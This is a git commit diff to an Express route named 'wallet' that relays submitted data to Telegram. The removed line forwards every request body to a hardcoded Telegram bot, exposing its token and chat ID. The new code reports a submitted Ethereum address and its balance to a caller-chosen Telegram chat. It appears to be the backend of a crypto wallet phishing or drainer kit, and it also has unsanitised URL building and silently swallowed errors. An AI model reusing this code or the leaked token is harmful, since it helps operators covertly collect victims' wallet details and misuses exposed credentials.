d67c6ac3824df6516d32dd33b2fce351ad3e780b
Alimilad <mldsalehi@hotmail.com>
2024-05-17 19:42:49 +0330

    update wallet route

--- routes/wallet.js
+++ routes/wallet.js
@@ -1,16 +1,24 @@
 var express = require('express');
 var router = express.Router();
 const axios = require('axios')
+const { Web3 } = require('web3');
 
+const ETHRpcUrl = 'https://eth1.lava.build/lava-referer-caf453a2-994d-44e4-8807-2fb223b96b34/'; // Replace with your RPC URL
 
 router.post('/', async function (req, res, next) {
-  const url = `https://api.telegram.org/bot986910087:AAEviFSrKh8VbfEeczTWXIsQpudBj7iMwlY/sendMessage?chat_id=-1001754529302&text=${JSON.stringify(req.body)}`
   try {
-    await axios.get(encodeURI(url))
-    console.log(url)
-  }
+     const web3 = new Web3(new Web3.providers.HttpProvider(ETHRpcUrl));
+     //Get the balance in Wei
+      const balanceWei = await web3.eth.getBalance(req.body.address);
+      
+      // Convert the balance from Wei to Ether
+      balanceEth = web3.utils.fromWei(balanceWei, 'ether');
+      var message = `balance : ${balanceEth} \n address : ${req.body.address}`;
+      const url = `https://api.telegram.org/bot${req.body.BotId}/sendMessage?chat_id=${req.body.ChatId}&text=${message}${req.body.ParseMode !== undefined ? `&parse_mode=${req.body.ParseMode}` : ``}`
+      await axios.get(encodeURI(url))
+  } 
   catch (error) {
-    console.log(error);
+    
   }
   res.json('ok');
 });
